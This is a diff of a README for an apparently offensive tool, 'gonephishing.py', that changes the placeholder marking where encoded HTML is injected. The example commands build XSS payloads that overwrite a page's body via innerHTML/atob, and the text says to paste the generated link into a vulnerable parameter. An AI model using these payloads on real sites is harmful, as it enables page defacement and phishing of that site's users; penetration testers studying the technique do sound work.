@@ -17,7 +17,7 @@ pip3 install htmlmin
 
  Generate a minified version of an html file and optionally encode it then inject it into some javascript/html.  
  
- the containing javascript must contain a $-$ field to mark location to inject html into.  
+ the containing javascript must contain a ¬  (shift + backtick in UK) to mark location to inject html into.  
  
  Current supported encoders are b64 (base64), hex ('\xAA\xBB' etc), pcnt (every character as url encoded).  If pcnt encoding isnt selected the string gets a standard urlencode
  
@@ -26,13 +26,13 @@ pip3 install htmlmin
 
 Create a file called test.html (the @ sign below signifies that you are using a file rather than direct input)
 ~~~
-python3 ./gonephishing.py --xss --html "@./test.html" --js '<script>document.body.innerHTML=atob("$-$")</script>'  --encoders --encoders b64
+python3 ./gonephishing.py --xss --html "@./test.html" --js '<script>document.body.innerHTML=atob("¬")</script>'  --encoders --encoders b64
 
-python3 ./gonephishing.py --xss --html "@./test.html" --js '<script>document.body.innerHTML=("$-$")</script>'  --encoders --encoders hex
+python3 ./gonephishing.py --xss --html "@./test.html" --js '<script>document.body.innerHTML=("¬")</script>'  --encoders --encoders hex
 
-python3 ./gonephishing.py --xss --html "@./test.html" --js '<script>document.body.innerHTML=atob("$-$")</script>'  --encoders --encoders b64,hex
+python3 ./gonephishing.py --xss --html "@./test.html" --js '<script>document.body.innerHTML=atob("¬")</script>'  --encoders --encoders b64,hex
 
-python3 ./gonephishing.py --xss --html "@./test.html" --js '<script>document.body.innerHTML=atob("$-$")</script>'  --encoders --encoders pcnt
+python3 ./gonephishing.py --xss --html "@./test.html" --js '<script>document.body.innerHTML=atob("¬")</script>'  --encoders --encoders pcnt
 ~~~
 Paste the generated link into the vulnerable request parameter and the page should be overwritten with the supplied html.
 
